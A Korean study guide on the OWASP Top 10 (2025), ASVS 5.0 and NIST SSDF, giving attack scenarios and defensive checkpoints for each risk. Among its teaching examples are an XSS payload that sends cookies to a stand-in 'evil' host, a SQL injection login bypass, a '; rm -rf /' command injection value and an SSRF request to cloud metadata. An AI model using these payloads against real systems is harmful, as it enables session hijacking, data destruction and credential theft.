## 1. OWASP Top 10 (2025) — 가장 중대한(critical) 위험 10가지

공식 명칭은 "The Ten Most Critical Web Application Security Risks" — 단순 발생 빈도 순위가 아니라, 수집된 취약점 데이터에 악용 가능성(exploitability)·영향(impact)과 커뮤니티 설문을 더해 **중대성** 기준으로 선정한다(A09처럼 데이터만으로 순위 매기기 어려워 설문으로 포함된 항목도 있다).
2025판 목록 (2021판 대비 변화 포함) — 아래 표는 **개요**이고, 각 항목의 공격·방어는 그 아래 소절에서 상세히 본다.

| # | 항목 | 근본 원인 한 줄 |
|---|------|----------------|
| A01 | **Broken Access Control** (+ SSRF 흡수) | "인증됐는가"만 보고 "이 자원에 권한 있는가"를 안 본다 |
| A02 | **Security Misconfiguration** (5→2위 상승) | 기본값·디버그 모드·열린 포트·불필요 기능이 그대로 배포된다 |
| A03 | **Software Supply Chain Failures** (신설, 구 Vulnerable Components 확장) | 내 코드가 아니라 의존성·빌드·배포 경로가 뚫린다 |
| A04 | **Cryptographic Failures** | 암호화를 안 하거나, 약한 알고리즘·키 관리 실패 |
| A05 | **Injection** (XSS 포함) | 데이터와 코드(쿼리·명령·마크업)의 경계가 없다 |
| A06 | **Insecure Design** | 구현 버그가 아니라 설계 단계에서 위협을 고려하지 않았다 |
| A07 | **Authentication Failures** | 크리덴셜 스터핑·약한 세션·MFA 부재 |
| A08 | **Software or Data Integrity Failures** | 서명·무결성 검증 없는 업데이트·역직렬화·CI 아티팩트 |
| A09 | **Security Logging & Alerting Failures** | 침해가 일어나도 보이지 않고, 보여도 울리지 않는다 |
| A10 | **Mishandling of Exceptional Conditions** (신설) | 에러·예외 경로에서 fail-open, 상태 오염, 정보 노출 |

2021 → 2025 요점: 공급망(A03)과 예외 처리(A10)가 신설, SSRF는 A01에 흡수, Misconfiguration이 2위로.

> 아래 공격 예시는 **교육용 전형 예**다 — 실제 공격 코드가 아니라 "어떤 결함이 어떻게 악용되는가"를 이해하기 위한 것.

### A01. Broken Access Control (접근 통제 실패)

**무엇인가**: 로그인은 됐지만(인증) "이 사용자가 *이 자원*을 볼/바꿀 권한이 있는가"(인가)를 서버가 다시 확인하지 않는 결함. 권한 판단을 클라이언트나 URL 파라미터에 맡기면 뚫린다. SSRF도 2025판에서 이 항목에 흡수됐다 — 공격자가 서버가 대신 보내는 요청의 대상(내부·외부 모두 가능)을 조작하는 문제로, "서버가 접근하면 안 될 자원에 접근"한다는 점에서 접근 통제와 겹치지만, URL 입력 검증·신뢰 경계·아웃바운드(서버 발신) 통제 실패도 핵심 원인이다.

**공격 시나리오**:
- **IDOR(수평 권한 상승)**: 로그인한 사용자가 자기 주문 번호 1000을 보다가 URL만 바꾼다.
  ```http
  GET /api/orders/1337   # 남의 주문인데 소유권 검사가 없어 그대로 반환됨
  ```
- **강제 브라우징(수직 권한 상승)**: 일반 사용자가 `/admin/users`에 직접 접근하는데, 메뉴만 숨겼을 뿐 서버가 역할을 검사하지 않아 관리자 기능이 열린다.
- **SSRF**: 이미지 URL을 받아 서버가 가져오는 기능에 `http://169.254.169.254/latest/meta-data/`(클라우드 메타데이터)를 넣어 내부 자격증명을 빼낸다.

**방어 체크포인트**:
- 모든 자원 접근이 **서버 측에서** 소유권·역할을 검사하는가? (URL·hidden 필드 값을 믿지 않는가 — JWT는 서명·발급자·만료를 검증한 뒤 클레임을 쓰는가, role 클레임만 보고 자원 단위 소유권 검사를 생략하지 않는가)
- 기본이 **deny by default**인가 — 명시 허용이 없으면 거부되는가?
- 객체 식별자를 순차 ID로 노출하는가, 아니면 접근할 때마다 소유권을 확인하는가?
- SSRF: 서버가 외부에서 받은 URL로 요청할 때 대상 주소를 allowlist로 제한하는가?

### A02. Security Misconfiguration (보안 설정 오류)

**무엇인가**: 코드가 아니라 **설정**의 문제. 기본 계정·기본 비밀번호, 디버그 모드, 상세 에러 스택 노출, 불필요한 포트·기능·샘플 앱이 운영에 그대로 남는다. 2021판 5위에서 2위로 상승 — 클라우드·컨테이너로 설정면이 넓어진 결과.

**공격 시나리오**:
- 관리 콘솔(예: 대시보드·DB 관리 UI)이 인터넷에 열려 있고 **기본 자격증명**(admin/admin)이 유지돼 로그인된다.
- 운영 서버가 디버그 모드로 떠 있어 예외 발생 시 **스택트레이스·환경변수·쿼리**가 응답에 노출된다.
- S3 버킷·저장소가 "공개 읽기"로 설정돼 있어 인증 없이 데이터가 인덱싱된다.

**방어 체크포인트**:
- 운영 배포에서 디버그·상세 에러가 꺼져 있는가? 기본 계정/키는 제거·교체됐는가?
- 설정이 **코드로 관리(IaC)** 되고 리뷰되는가, 아니면 사람이 콘솔에서 손으로 켰다 껐다 하는가?
- 새 인프라의 기본값이 "닫힘"인가 — 최소 권한·최소 노출로 시작하는가?

### A03. Software Supply Chain Failures (소프트웨어 공급망 실패)

**무엇인가**: 내가 짠 코드가 아니라 **의존성·빌드·배포 경로**가 공격면. 구 "Vulnerable and Outdated Components"를 확장해, 취약한 라이브러리뿐 아니라 빌드 서버 침해·악성 패키지·변조된 아티팩트까지 포함한다.

**공격 시나리오**:
- **취약 의존성**: 앱이 오래된 Log4j를 전이 의존성으로 물고 있어 Log4Shell(원격 코드 실행)에 노출된다.
- **빌드 파이프라인 침해**: 공격자가 CI/CD를 뚫고 **서명된** 업데이트에 백도어를 심어 배포한다(SolarWinds형).
- **타이포스쿼팅**: `reqiests` 같은 오타 패키지명이 악성 코드를 담고 배포돼 무심코 설치된다.

**방어 체크포인트**:
- 의존성이 **lockfile로 고정**되고 CI에서 취약점 스캔(SCA)이 도는가?
- 빌드 산출물을 **서명·검증**하는가(sigstore 등)? SBOM(자재명세서)이 있는가?
- 새 의존성을 추가할 때 출처·유지보수 상태를 확인하는가?
- 사건 1줄: Log4Shell(2021)·SolarWinds(2020)·xz backdoor(2024) — 모두 "내 코드는 멀쩡했다".

### A04. Cryptographic Failures (암호화 실패)

**무엇인가**: 보호해야 할 데이터를 **암호화하지 않거나**, 약한 알고리즘·잘못된 키 관리로 사실상 무방비인 상태. 결과는 민감정보 노출이므로 데이터 자체가 초점이다.

**공격 시나리오**:
- **평문/약한 해시 비밀번호 저장**: DB가 유출됐는데 비밀번호가 평문 혹은 소금 없는 MD5로 저장돼 즉시 크래킹된다.
  ```text
  users 테이블 유출 → password = "hunter2"(평문) 또는 MD5(무염) → 레인보우 테이블로 복원
  ```
- **평문 전송**: 로그인이 HTTP(TLS 없음)로 오가 중간자가 자격증명을 가로챈다.
- **하드코딩된 키**: 대칭키가 소스코드/리포에 커밋돼 있어 암호문이 사실상 공개다.

**방어 체크포인트**:
- 저장 시 비밀번호는 **느린 해시(bcrypt/argon2)+솔트**인가? 대칭 암호화가 필요한 데이터에 최신 알고리즘을 쓰는가?
- 전송 구간이 **모두 TLS**인가(내부 통신 포함)?
- 키가 코드가 아니라 **시크릿 매니저/KMS**에 있고 회전되는가?

### A05. Injection (인젝션 — XSS 포함)

**무엇인가**: 사용자 입력이 **데이터가 아니라 코드로 해석**되는 결함. 쿼리·OS 명령·LDAP·마크업의 경계가 없을 때 발생. XSS도 "브라우저가 입력을 스크립트로 실행"하는 인젝션이라 이 항목에 포함된다.

**공격 시나리오**:
- **SQL Injection**: 로그인 폼의 아이디에 `' OR 1=1 --`를 넣어 WHERE 절을 항상 참으로 만든다.
  ```sql
  SELECT * FROM users WHERE id = '' OR 1=1 --' AND pw = '...'  -- 첫 사용자로 로그인
  ```
- **XSS**: 게시글 본문에 `<script>fetch('//evil/'+document.cookie)</script>`를 넣어 다른 사용자의 세션 쿠키를 탈취한다.
- **명령 인젝션**: 파일명 파라미터에 `; rm -rf /`를 붙여 서버 셸 명령을 실행시킨다.

**방어 체크포인트**:
- DB 접근이 **파라미터 바인딩**(prepared statement)인가 — 문자열로 쿼리를 이어붙이지 않는가?
- 출력 시 컨텍스트에 맞는 **이스케이프/인코딩**을 하는가(HTML·속성·JS·URL 각각)?
- OS 명령·직렬화 등 위험한 싱크를 아예 피하거나 allowlist로 막는가?

### A06. Insecure Design (안전하지 않은 설계)

**무엇인가**: 구현 버그가 아니라 **설계 단계에서 위협을 고려하지 않은** 결함. 아무리 코드를 깨끗이 짜도 설계 자체가 악용을 허용하면 뚫린다 — "잘 구현된 취약한 기능".

**공격 시나리오**:
- **비즈니스 로직 남용**: 비밀번호 재설정이 "이메일로 받은 4자리 숫자"만 요구하는데 시도 횟수 제한이 없어 **무차별 대입**으로 남의 계정을 탈취한다.
- **쿠폰·환불 로직**: 한 번 쓸 쿠폰을 동시에 여러 요청으로 보내(경쟁 조건) 잔액보다 많이 환불받는다.

**방어 체크포인트**:
- 새 기능마다 **위협 모델링**을 했는가 — "누가 이걸 어떻게 오용할까"를 설계 때 물었는가?
- 비율 제한·상태 검증·중복 방지 같은 **오용 방지 통제**가 설계에 들어 있는가?
- 신뢰 경계(누가 무엇을 믿는가)가 명시돼 있는가?

### A07. Authentication Failures (인증 실패)

**무엇인가**: "당신이 진짜 그 사람인가"를 확인하는 절차의 결함. 약한 비밀번호 정책, 크리덴셜 스터핑 무방비, 취약한 세션·토큰 관리, MFA 부재.

**공격 시나리오**:
- **크리덴셜 스터핑**: 다른 사이트에서 유출된 이메일/비밀번호 목록을 자동화로 대입해, 재사용한 사용자 계정에 로그인한다(속도 제한·MFA 없으면 성공).
- **세션 고정/탈취**: 로그인 후에도 세션 ID가 바뀌지 않아, 공격자가 미리 심어둔 세션으로 로그인 상태를 가로챈다.

**방어 체크포인트**:
- 로그인에 **속도 제한·계정 잠금·MFA**가 있는가? 유출 비밀번호 목록을 차단하는가?
- 로그인 성공 시 **세션 ID를 재발급**하는가? 세션이 만료·무효화되는가?
- 비밀번호 정책이 "복잡성 강요"가 아니라 "길이 허용+유출 차단" 방향인가?

### A08. Software or Data Integrity Failures (무결성 실패)

**무엇인가**: 코드·데이터가 **변조되지 않았음을 검증하지 않는** 결함. 서명 없는 업데이트, 신뢰할 수 없는 소스의 역직렬화, 무결성 검사 없는 CI 아티팩트.

**공격 시나리오**:
- **안전하지 않은 역직렬화**: 서버가 사용자가 보낸 직렬화 객체를 그대로 복원하는데, 조작된 페이로드가 복원 과정에서 코드를 실행한다(예: Java/Python pickle gadget chain).
  ```text
  쿠키/파라미터에 base64 직렬화 객체 → 서버가 deserialize → 객체 생성 부수효과로 RCE
  ```
- **CI 아티팩트 변조**: 서명 검증이 없어, 저장소나 캐시에서 바꿔치기된 빌드 결과물이 배포된다.
- **무검증 자동 업데이트**: 앱이 업데이트 서명을 확인하지 않아 중간자가 악성 업데이트를 밀어 넣는다.

**방어 체크포인트**:
- 신뢰 못 할 데이터를 **역직렬화하지 않거나** 타입/포맷을 엄격히 제한하는가?
- 업데이트·아티팩트에 **디지털 서명 검증**이 있는가?
- CI 파이프라인 자체의 무결성(누가 무엇을 바꿀 수 있는가)이 보호되는가? (A03와 겹침)

### A09. Security Logging & Alerting Failures (로깅·경보 실패)

**무엇인가**: 침해가 일어나도 **기록이 없어 보이지 않고**, 기록이 있어도 **경보가 없어 아무도 모른다**. 탐지·대응이 늦어지는 근본 원인. (2025판에서 명칭에 Alerting이 강조됨)

**공격 시나리오**:
- 공격자가 몇 주간 데이터를 조금씩 빼가는데, 인증 실패·비정상 조회에 대한 로그가 없어 사후에도 침해 범위를 재구성하지 못한다.
- 로그는 있으나 아무도 보지 않고 알림이 없어, 유출을 **외부(고객·언론)가 먼저 발견**한다.

**방어 체크포인트**:
- 인증 실패·권한 거부·중요 자원 접근이 **로그로 남고**, 임계 이벤트에 **경보**가 울리는가?
- 로그에 민감정보(비밀번호·토큰)를 실수로 남기지 않으면서, 사후 추적에 충분한가?
- 로그가 변조·삭제로부터 보호되는가(공격자가 지우지 못하게)?

### A10. Mishandling of Exceptional Conditions (예외 처리 실패)

**무엇인가**: 2025판 신설. **에러·예외·경계 상황**에서 코드가 잘못 반응하는 결함 — fail-open(실패했는데 통과), 상태 오염, 예외 메시지로 정보 노출, 처리 안 된 예외로 인한 서비스 중단.

**공격 시나리오**:
- **결제/인증 fail-open**: 외부 결제·권한 서버가 타임아웃날 때 코드가 `catch` 후 "일단 승인"으로 처리해, 공격자가 그 서비스를 일부러 죽여 무료로 결제를 통과시킨다.
  ```text
  try { authz(); } catch (e) { /* 로그만 찍고 계속 진행 */ }  // 실패가 곧 허용이 됨
  ```
- **정보 노출**: 예외 메시지에 SQL·파일 경로·내부 IP가 그대로 담겨 응답으로 나간다.
- **상태 오염**: 트랜잭션 중간 실패 시 롤백이 없어 데이터가 일관성 없는 상태로 남는다.

**방어 체크포인트**:
- 실패 시 기본이 **fail-closed**(거부)인가 — 특히 인증·인가·결제 경로에서?
- 예외 메시지가 사용자에겐 일반화되고, 상세는 **서버 로그에만** 남는가?
- 부분 실패 시 상태가 **원자적으로 롤백**되는가?

## 2. OWASP ASVS 5.0 — 검증 수준과 구조

- **성격**: 애플리케이션이 만족해야 할 보안 **요구사항 목록**(약 350개, 17개 챕터 V1~V17). 요구사항마다 L1/L2/L3 태그. 2025년 5월 릴리즈.
- **수준(누적)** — "이 서비스라면 어느 레벨인가"를 판단하는 예시와 함께:
  - **L1** — 최소선(critical starting point). 흔한 공격을 막는 1차 방어선 요구사항. 단, 5.0은 "L1이 소스 접근 없는 블랙박스 침투테스트만으로 검증 가능한 수준은 아니다"라고 명시(4.0의 '침투테스트 가능' 프레임을 버림).
    - *판단 예*: 로그인이 없는 공개 정보성 사이트·사내 저위험 도구 — 민감 데이터를 다루지 않는 서비스의 최소 기준선.
  - **L2** — 대부분의 애플리케이션이 목표로 삼아야 할 수준(로그인·개인정보·결제가 있으면 여기). 덜 흔한 공격·더 정교한 방어까지.
    - *판단 예*: 회원 가입·개인정보·주문/결제가 있는 일반 SaaS·커머스·업무 시스템 → **대부분 여기가 목표**. 예: "장바구니+결제가 있는 쇼핑몰"은 L2.
  - **L3** — 최고 수준의 보안을 입증하려는 시스템(금융 코어·의료 등)의 고보증 수준 — 심층 방어(defense-in-depth) 통제 포함.
    - *판단 예*: 은행 코어뱅킹·증권 체결·전자의무기록(EMR)처럼 침해 시 회복 불가·규제가 고보증을 요구하는 시스템. (참고 프로젝트 jun-bank의 코어라면 L3 지향)
- **17개 챕터**(5.0): V1 인코딩·새니타이즈, V2 검증·비즈니스 로직, V3 웹 프론트엔드 보안, V4 API/웹서비스, V5 파일 처리, V6 인증, V7 세션 관리, V8 인가, V9 자가 포함 토큰(JWT), V10 OAuth/OIDC, V11 암호화, V12 통신 보안, V13 설정, V14 데이터 보호, V15 시큐어 코딩·아키텍처, V16 보안 로깅·에러 처리, V17 WebRTC(신설).
- **대표 요구사항 감 잡기**(정확 문구가 아니라 *취지* — 원문 표현은 ASVS 5.0 원전 확인):
  - **V6 인증**: "비밀번호는 최소 8자 이상 허용하고, 64자 이상의 긴 비밀번호도 거부하지 않는다"(취지 — 길이는 허용하되 상한으로 막지 않음). "흔한/유출된 비밀번호 목록과 대조해 차단한다." (원문 표현은 ASVS 확인)
  - **V8 인가**: "모든 자원 접근은 서버 측에서 권한을 검증한다 — 클라이언트가 보낸 역할·권한을 신뢰하지 않는다." "기본이 거부(deny by default)이며, 접근 통제 규칙은 신뢰 경계 안(서버)에서 강제된다." (원문 표현은 ASVS 확인)
  - **V11 암호화**: "저장 비밀번호는 최신 지침에 맞게 설정한, 승인된 계산집약적 KDF(password hashing function)로 해시한다"(원문은 특정 알고리즘·솔트를 열거하지 않음 — 구체 선택은 OWASP 최신 지침 참조: argon2id 우선, bcrypt는 레거시 호환 쪽). "암호 키는 소스코드가 아니라 안전한 키 저장소에서 관리하고 회전 가능해야 한다." (원문 표현은 ASVS 확인)
- **쓰는 법**: 요구사항 명세·보안 리뷰 체크리스트·침투테스트 범위 정의의 **계약서**로 쓴다. "우리 서비스는 ASVS L2를 만족한다"가 검증 가능한 문장이 된다.

## 3. NIST SP 800-218 SSDF v1.1 — 네 그룹의 관행

소프트웨어 개발 수명주기(SDLC)에 심는 **조직 차원의 보안 관행** 프레임워크. 미 행정명령 EO 14028 이후 연방 조달의 사실상 요구 기준.

```text
PO  Prepare the Organization      요구사항 정의 · 역할/책임 · 툴체인 보안 · 보안 기준선
PS  Protect the Software          코드/아티팩트 무결성(서명·접근 통제) · 릴리즈 보호
PW  Produce Well-Secured Software 위협 모델링 · 보안 요구 반영 설계 · 시큐어 코딩 ·
                                  코드 리뷰/정적·동적 분석 · 안전한 기본 설정 · 재사용 컴포넌트 평가
RV  Respond to Vulnerabilities    취약점 식별·확인 · 수정과 공개(disclosure) · 근본 원인 분석
```

각 관행(Practice)은 하위 작업(Task)·구현 예·참조 문서로 구성 — "무엇을"만 정하고 "어떻게"는 조직이 채운다.

**그룹별 실무 예시**:
- **PO (조직 준비)**: 저장소마다 보안 요구사항·시큐어 코딩 가이드를 정의하고, 리뷰 승인자·보안 담당 역할을 명시한다. 개발 툴체인(빌드·CI) 자체를 보안 기준선으로 잠근다(예: 브랜치 보호 규칙·필수 리뷰어).
- **PS (소프트웨어 보호)**: **커밋 서명**(signed commits)·**아티팩트 서명**으로 코드와 빌드 산출물의 무결성을 보장한다. 릴리즈 산출물을 접근 통제된 저장소에 두고 원본 변조를 막는다.
- **PW (안전한 소프트웨어 생산)**: 새 기능마다 위협 모델링 1회, **PR마다 SAST(정적 분석) 게이트**·의존성 스캔을 자동으로 돌린다. 안전한 기본 설정을 프레임워크에 심어 개발자가 "실수로 안전"하게 만든다.
- **RV (취약점 대응)**: 취약점 제보 창구(security.txt·bug bounty)를 운영하고, 신고 접수 → 확인 → 패치 → 공개(disclosure) 절차를 문서화한다. 수정 후 **근본 원인 분석**으로 같은 패턴을 전수 점검한다.

## 4. 세 기준의 연결 — 위험 하나를 끝까지 추적하기

예: **A01 Broken Access Control**

```text
Top 10   위험 인식: IDOR·수평/수직 권한 상승·SSRF가 가장 중대한 위험군이다
   ↓
ASVS     제품 요구: "모든 자원 접근은 서버 측에서 소유권/권한을 검증한다",
         "기본 거부(deny by default)" 등 인가 챕터의 L1~L2 요구사항으로 구체화
   ↓
SSDF     과정 보장: PW(위협 모델링에서 인가 경계 식별, 코드 리뷰 체크리스트에 포함)
         + RV(IDOR 신고 접수 → 근본 원인 분석 → 같은 패턴 전수 점검)
```

이 추적이 되면 "보안 하자"가 아니라 "어느 층의 무엇을 하자"로 말할 수 있다.

## 5. 현장에서 만나는 상황

- **코드 리뷰**: Top 10을 리뷰 렌즈로 — 입력이 쿼리·명령에 닿는 경로(A05), 권한 검사 위치(A01), 에러 경로의 fail-open(A10).
- **CI**: 의존성 스캔(A03)·정적 분석(SSDF PW)·시크릿 스캔을 파이프라인에 — 사람의 기억이 아니라 자동 게이트로.
- **설계 리뷰**: 새 기능마다 위협 모델링 한 번(A06, SSDF PW) — "누가 무엇을 훔치거나 망가뜨리고 싶어할까"를 표로.
- **장애·사고**: 로그에 인증 실패·권한 거부가 남는가, 울리는가(A09) — 운영 축(observability)과 겹치는 지점.

## 핵심 문장

- Top 10 = 인식, ASVS = 제품 기준, SSDF = 과정 기준 — 층이 다르므로 서로 대체가 안 된다.
- 2025판의 신호: 공격면이 "내 코드"에서 **의존성·빌드 경로(A03)와 예외 경로**(A10)로 넓어졌다.
- ASVS의 가치는 보안을 **검증 가능한 문장**("L2 만족")으로 바꾸는 것.
- SSDF의 가치는 보안을 개인기가 아니라 **조직의 반복 가능한 과정**으로 만드는 것.

### A. 공급망(A03)의 실제 사건들

SolarWinds(빌드 서버 침해 → 서명된 악성 업데이트), Log4Shell(전이 의존성 하나가 전 세계 노출), xz backdoor(2024, 오픈소스 메인테이너 사회공학). 대응 어휘: SBOM(자재명세서), SLSA(빌드 무결성 등급), 의존성 고정(lockfile)과 서명 검증(sigstore).

### B. "Shift left"의 함정

SSDF류 프로세스를 "개발자에게 보안 업무 떠넘기기"로 구현하면 실패한다. 작동하는 형태는 **가드레일**(안전한 기본값을 가진 프레임워크·파이프라인 자동 게이트)이지, 체크리스트 추가가 아니다 — Top 10의 A02(Misconfiguration)가 계속 상위인 이유이기도 하다.

### C. 한국 맥락의 이웃 기준

KISA 주요정보통신기반시설 취약점 분석·평가 기준, 전자금융 감독규정, ISMS-P 인증 — 법률 축(legal-standards)과 보안 축이 실제로 만나는 지점은 국내에서는 이런 제도들이다.
